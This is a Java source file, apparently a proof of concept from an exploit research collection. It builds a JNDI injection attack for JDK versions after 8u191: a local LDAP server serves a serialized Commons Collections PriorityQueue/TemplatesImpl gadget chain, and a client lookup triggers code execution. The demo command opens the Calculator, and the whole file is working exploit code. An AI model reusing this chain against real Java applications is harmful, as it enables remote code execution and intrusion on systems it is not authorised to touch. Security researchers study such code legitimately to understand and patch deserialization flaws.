package com.threedr3am.bug.rmi.client;

import com.threedr3am.bug.common.server.LdapServer;
import com.threedr3am.bug.common.utils.Reflections;
import com.threedr3am.bug.rmi.utils.Gadgets;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.PriorityQueue;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

/**
 * 在jdk8u121版本后，jdk加入了rmi远程代码信任机制，除非设置环境变量com.sun.jndi.rmi.object.trustURLCodebase为true，否则不会加载远程代码
 *
 * @author threedr3am
 */
public class JndiLookupForGtJdk8u191 {

  static {
    try {
      LdapServer.classData = makePayload(new String[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
    } catch (Exception e) {
      e.printStackTrace();
    }
    LdapServer.run();
  }

  public static void main(String[] args) {
    try {
      new InitialContext().lookup("ldap://127.0.0.1:43658/PriorityQueue");
    } catch (NamingException e) {
      e.printStackTrace();
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  private static byte[] makePayload(String[] args) throws Exception {
    final Object templates = Gadgets.createTemplatesImpl(args[0]);
    // mock method name until armed
    final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

    // create queue with numbers and basic comparator
    final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,new TransformingComparator(transformer));
    // stub data for replacement later
    queue.add(1);
    queue.add(1);

    // switch method called by comparator
    Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

    // switch contents of queue
    final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
    queueArray[0] = templates;
    queueArray[1] = 1;

    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
    ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
    objectOutputStream.writeObject(queue);
    objectOutputStream.close();
    return byteArrayOutputStream.toByteArray();

  }
}
